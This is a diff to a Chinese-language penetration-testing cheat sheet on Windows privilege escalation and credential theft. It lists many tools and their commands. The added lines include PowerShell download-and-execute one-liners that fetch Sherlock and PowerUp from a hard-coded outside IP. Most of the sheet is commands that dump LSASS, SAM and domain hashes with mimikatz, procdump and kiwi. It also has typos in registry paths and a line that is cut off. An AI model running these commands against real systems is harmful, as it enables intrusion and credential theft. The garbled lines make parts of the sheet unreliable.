@@ -194,22 +194,65 @@ UAC (User Account Control) 是Windows的一个安全机制，当一些敏感操�
 + 查看系统补丁信息
 	- ``systeminfo``
 	- ``Wmic qfe get Caption,Description,HotFixID,InstalledOn``
+	- MSF模块：``post/windows/gather/enum_patches``
 + 查询系统未修复可提权补丁
 	- ``https://i.hacking8.com/tiquan/``
-+ 相关工具
++ 提权检测
 	- MSF后模块
-		+ ``post/windows/gather/enum_patches``
 		+ ``post/multi/recon/local_exploit_suggester``
 	- windows exploit suggester
-		+ ``https://github.com/AonCyberLabs/Windows-Exploit-Suggester``
-	- powershell中的sherlock脚本
-		+ ``Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块``
-		+ ``Find-AllVulns``
-	- Empire内置模块
-		+ ``usemodule privesc/powerup/allchecks``
-		+ ``execute``
+		+ 项目地址：``https://github.com/AonCyberLabs/Windows-Exploit-Suggester``
+		+ 目标机器运行，需要python环境
+	- sherlock.ps1
+		+ 项目地址：``https://github.com/rasta-mouse/Sherlock``
+		+ 本地导入
+			::
+				
+				下载Sherlock.ps1放在C盘根目录，使用powershell执行下面命令
+				Import-Module C:\Sherlock.ps1
+				提示没有权限，请输入：set-ExecutionPolicy RemoteSigned
+				Find-AllVulns
+		+ 远程下载执行
+			- ``powershell -Version 2  -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://118.195.199.66:8088/Sherlock.ps1');Find-AllVulns``
+	- PowerUp.ps1
+		+ 项目地址：``https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1``
+		+ 本地导入
+			::
+				
+				下载PowerUp.ps1放在C盘根目录，使用powershell执行下面命令
+				Import-Module C:\PowerUp.ps1
+				Invoke-AllChecks
+		+ 远程下载执行
+			- ``powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://118.195.199.66:8088/PowerUp.ps1');Invoke-AllChecks``
+	- PrivescCheck.ps1
+		+ 项目地址：``https://github.com/itm4n/PrivescCheck``
 	- winPEAS
-		+ ``https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS``
+		+ 项目地址：``https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS``
+		+ 包含exe，bat，ps1方式。
+		+ exe需要.net 4.0.30319
+	- BeRoot
+		+ 项目地址：``https://github.com/AlessandroZ/BeRoot``
+		+ exe文件
+	- Powerless
+		+ 项目地址：``https://github.com/gladiatx0r/Powerless``
+		+ bat文件
+	- systeminfo离线检测
+		+ 项目地址：``https://github.com/bitsadmin/wesng``
+		+ 使用：``python wes.py systeminfo.txt``
+	- GhostPack 
+		+ 地址：``https://github.com/GhostPack``
+		+ 预编译地址：``https://github.com/r3motecontrol/Ghostpack-CompiledBinaries``
+		+ 包含工具
+			- Rubeus：Kerberos 协议交互工具。
+			- Seatbelt：主机安全检查。
+				::
+				
+					Seatbelt.exe -group=all -full
+					Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
+					Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
+			- SharpUp：识别本地权限提升路径。
+			- SafetyKatz：类似 Mimikatz。
++ 提权工具
 	- NSudoLG
 		+ 项目地址：``https://github.com/M2TeamArchived/NSudo``
 		+ 提权：``NSudoLG.exe -U:T -P:E cmd /C "C:\test.exe" & exit"``
@@ -227,15 +270,15 @@ UAC (User Account Control) 是Windows的一个安全机制，当一些敏感操�
 + schtasks方式
 + at方式
 + 交互式服务
-    ::
-    
-        适用环境：win7，xp
-        以管理员权限运行cmd，输入并运行 “sc Create SuperCMD binPath= "cmd /K start" type= own type= interact” 安装名为SuperCMD的交互式服务。
-        cmd运行“net start SuperCMD”命令，启动服务。
-        弹出“交互式服务检测”对话框，点击查看消息，进入的cmd窗口就是system权限了。
-        关闭和卸载：
-        net stop SuperCMD
-        sc delete SuperCMD
+	::
+
+		适用环境：win7，xp
+		以管理员权限运行cmd，输入并运行 “sc Create SuperCMD binPath= "cmd /K start" type= own type= interact” 安装名为SuperCMD的交互式服务。
+		cmd运行“net start SuperCMD”命令，启动服务。
+		弹出“交互式服务检测”对话框，点击查看消息，进入的cmd窗口就是system权限了。
+		关闭和卸载：
+		net stop SuperCMD
+		sc delete SuperCMD
 
 凭证窃取
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -252,131 +295,127 @@ UAC (User Account Control) 是Windows的一个安全机制，当一些敏感操�
 		- 一款针对向日葵的识别码和验证码提取工具
 		- 项目地址：``https://github.com/wafinfo/Sunflower_get_Password``
 - Windows本地密码散列导出工具
-    + mimikatz
-        - https://github.com/gentilkiwi/mimikatz/
-        - 输出日志： ``log``
-        - 权限提升： ``privilege::debug``
-        - sekurlsa模块
-            ::
-            
-                
-                抓取明文密码： sekurlsa::logonpasswords
-                sekurlsa::logonpasswords
+	+ mimikatz
+		- https://github.com/gentilkiwi/mimikatz/
+		- 输出日志： ``log``
+		- 权限提升： ``privilege::debug``
+		- 命令方式：``mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"``
+		- sekurlsa模块
+			::
+			
+				
+				抓取明文密码： sekurlsa::logonpasswords
+				sekurlsa::logonpasswords
 
-                抓取用户NTLM哈希
-                sekurlsa::msv
+				抓取用户NTLM哈希
+				sekurlsa::msv
 
-                加载dmp文件，并导出其中的明文密码
-                sekurlsa::minidump lsass.dmp
-                sekurlsa::logonpasswords full
+				加载dmp文件，并导出其中的明文密码
+				sekurlsa::minidump lsass.dmp
+				sekurlsa::logonpasswords full
 
-                导出lsass.exe进程中所有的票据
-                sekurlsa::tickets /export
-        - kerberos模块
-            ::
-            
-                列出系统中的票据
-                kerberos::list
-                kerberos::tgt
+				导出lsass.exe进程中所有的票据
+				sekurlsa::tickets /export
+		- kerberos模块
+			::
+			
+				列出系统中的票据
+				kerberos::list
+				kerberos::tgt
 
-                清除系统中的票据
-                kerberos::purge
+				清除系统中的票据
+				kerberos::purge
 
-                导入票据到系统中
-                kerberos::ptc 票据路径
-        - lsadump模块
-            ::
-            
-                在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
-                lsadump::dcsync /domain:kevin.com /user:root
+				导入票据到系统中
+				kerberos::ptc 票据路径
+		- lsadump模块
+			::
+			
+				在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
+				lsadump::dcsync /domain:kevin.com /user:root
 
-                (在域控上执行)读取所有域用户的哈希
-                lsadump::lsa /patch
+				(在域控上执行)读取所有域用户的哈希
+				lsadump::lsa /patch
 
-                从sam.hive和system.hive文件中获得NTLM Hash
-                lsadump::sam /sam:sam.hive /system:system.hive
+				从sam.hive和system.hive文件中获得NTLM Hash
+				lsadump::sam /sam:sam.hive /system:system.hive
 
-                从本地SAM文件中读取密码哈希
-                token::elevate
-                lsadump::sam
-        - wdigest
-            ::
-            
-                WDigest协议是在WindowsXP中被引入的,旨在与HTTP协议一起用于身份认证。
-                默认情况下,Microsoft在多个版本的Windows(Windows XP-Windows 8.0和Windows Server 2003-Windows Server 2012)中启用了此协议,
-                这意味着纯文本密码存储在LSASS(本地安全授权子系统服务)进程中。 Mimikatz可以与LSASS交互,允许攻击者通过以下命令检索这些凭据。
-                mimikatz #privilege::debug
-                mimikatz #sekurlsa::wdigest
-                在windows2012系统以及以上的系统之后这个默认是关闭的如果在 win2008 之前的系统上打了 KB2871997 补丁，那么就可以去启用或者禁用 
-                WDigest。Windows Server2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装
-                了KB2871997补丁，攻击者同样无法获取明文密码。配置如下键值：
-                HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
-                UseLogonCredential 值设置为 0, WDigest 不把凭证缓存在内存；UseLogonCredential 值设置为 1, WDigest 就把凭证缓存在内存。
-                使用powershell进行更改
-                开启Wdigest Auth
-                Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
-                关闭Wdigest Auth
-                Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid
-        - LSA保护
-            ::
-            
-                如何防止mimikatz获取一些加密的密文进行PTH攻击呢！其实微软推出的补丁KB2871997是专门针对PTH攻击的补丁，但是如果PID为500的话，
-                还是可以进行PTH攻击的！本地安全权限服务(LSASS)验证用户是否进行本地和远程登录,并实施本地安全策略。 Windows 8.1及更高版本的
-                系统中,Microsoft为LSA提供了额外的保护,以防止不受信任的进程读取内存或代码注入。Windows 8.1之前的系统,攻击者可以执行Mimikatz
-                命令来与LSA交互并检索存储在LSA内存中的明文密码。
+				从本地SAM文件中读取密码哈希
+				token::elevate
+				lsadump::sam
+		- wdigest
+			::
+			
+				WDigest协议是在WindowsXP中被引入的,旨在与HTTP协议一起用于身份认证。
+				默认情况下,Microsoft在多个版本的Windows(Windows XP-Windows 8.0和Windows Server 2003-Windows Server 2012)中启用了此协议,
+				这意味着纯文本密码存储在LSASS(本地安全授权子系统服务)进程中。 Mimikatz可以与LSASS交互,允许攻击者通过以下命令检索这些凭据。
+				mimikatz #privilege::debug
+				mimikatz #sekurlsa::wdigest
+				在windows2012系统以及以上的系统之后这个默认是关闭的如果在 win2008 之前的系统上打了 KB2871997 补丁，那么就可以去启用或者禁用 
+				WDigest。Windows Server2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装
+				了KB2871997补丁，攻击者同样无法获取明文密码。配置如下键值：
+				HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
+				UseLogonCredential 值设置为 0, WDigest 不把凭证缓存在内存；UseLogonCredential 值设置为 1, WDigest 就把凭证缓存在内存。
+				使用powershell进行更改
+				开启Wdigest Auth
+				Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+				关闭Wdigest Auth
+				Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid
+		- LSA保护
+			::
+			
+				如何防止mimikatz获取一些加密的密文进行PTH攻击呢！其实微软推出的补丁KB2871997是专门针对PTH攻击的补丁，但是如果PID为500的话，
+				还是可以进行PTH攻击的！本地安全权限服务(LSASS)验证用户是否进行本地和远程登录,并实施本地安全策略。 Windows 8.1及更高版本的
+				系统中,Microsoft为LSA提供了额外的保护,以防止不受信任的进程读取内存或代码注入。Windows 8.1之前的系统,攻击者可以执行Mimikatz
+				命令来与LSA交互并检索存储在LSA内存中的明文密码。
 
-                这条命令修改键的值为1，即使获取了debug权限吗，也不能直接获取明文密码和hash
-                reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f
-
-
-    + lsass
-    + wce
-    + gsecdump
-    + copypwd
-    + Pwdump
-    + ProcDump
-        - https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
-        - 管理员权限dump LSASS进程： ``procdump.exe -accepteula -ma lsass.exe 1.dmp``
-        - mimikatz读取密码： ``mimikatz.exe "log" "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit``
-    + msf中kiwi模块
-        - 加载： ``load kiwi``
-        - 帮助： ``help kiwi``
-        - 主要命令
-            ::
-            
-                creds_all：列举所有凭据
-                creds_kerberos：列举所有kerberos凭据
-                creds_msv：列举所有msv凭据
-                creds_ssp：列举所有ssp凭据
-                creds_tspkg：列举所有tspkg凭据
-                creds_wdigest：列举所有wdigest凭据
-                dcsync：通过DCSync检索用户帐户信息
-                dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
-                golden_ticket_create：创建黄金票据
-                kerberos_ticket_list：列举kerberos票据
-                kerberos_ticket_purge：清除kerberos票据
-                kerberos_ticket_use：使用kerberos票据
-                kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
-                lsa_dump_sam：dump出lsa的SAM
-                lsa_dump_secrets：dump出lsa的密文
-                password_change：修改密码
-                wifi_list：列出当前用户的wifi配置文件
-                wifi_list_shared：列出共享wifi配置文件/编码
-        - kiwi_cmd
-            ::
-            
-                kiwi_cmd可以使用mimikatz中的所有功能，命令需要接上mimikatz的命令
-                kikiwi_cmd sekurlsa::logonpasswords
+				这条命令修改键的值为1，即使获取了debug权限吗，也不能直接获取明文密码和hash
+				reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f
+	+ mimikatz.ps1
+		- 下载地址：``https://github.com/OmarFawaz/Invoke-Mimikatz.ps1-Version-2.1.1``
+		- 执行命令：Invoke-Mimikatz
+	+ Pwdump7
+		- 下载地址：``http://www.tarasco.org/security/pwdump_7/pwdump7.zip``
+	+ QuarkPwDump 
+		- 下载地址：``https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe``
+		- 使用：``QuarkPwDump.exe --dump-hash-local``
+	+ ProcDump
+		- https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+		- 管理员权限dump LSASS进程： ``procdump.exe -accepteula -ma lsass.exe 1.dmp``
+		- mimikatz读取密码： ``mimikatz.exe "log" "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit``
+	+ msf中kiwi模块
+		- 加载： ``load kiwi``
+		- 帮助： ``help kiwi``
+		- 主要命令
+			::
+			
+				creds_all：列举所有凭据
+				creds_kerberos：列举所有kerberos凭据
+				creds_msv：列举所有msv凭据
+				creds_ssp：列举所有ssp凭据
+				creds_tspkg：列举所有tspkg凭据
+				creds_wdigest：列举所有wdigest凭据
+				dcsync：通过DCSync检索用户帐户信息
+				dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
+				golden_ticket_create：创建黄金票据
+				kerberos_ticket_list：列举kerberos票据
+				kerberos_ticket_purge：清除kerberos票据
+				kerberos_ticket_use：使用kerberos票据
+				kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
+				lsa_dump_sam：dump出lsa的SAM
+				lsa_dump_secrets：dump出lsa的密文
+				password_change：修改密码
+				wifi_list：列出当前用户的wifi配置文件
+				wifi_list_shared：列出共享wifi配置文件/编码
+		- kiwi_cmd
+			::
+			
+				kiwi_cmd可以使用mimikatz中的所有功能，命令需要接上mimikatz的命令
+				kikiwi_cmd sekurlsa::logonpasswords
 - Windows本地密码破解工具
-    - L0phtCrack
-    - SAMInside
-    - Ophcrack
-- ntds.dit的导出+QuarkPwDump读取分析
-- vssown.vbs + libesedb + NtdsXtract
-- ntdsdump
-- 利用powershell(DSInternals)分析hash
-- 使用 ``net use \\%computername% /u:%username%`` 重置密码尝试次数
-- 限制读取时，可crash操作系统后，在蓝屏的dump文件中读取
+	+ L0phtCrack
+	+ SAMInside
+	+ Ophcrack
 
 其他
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
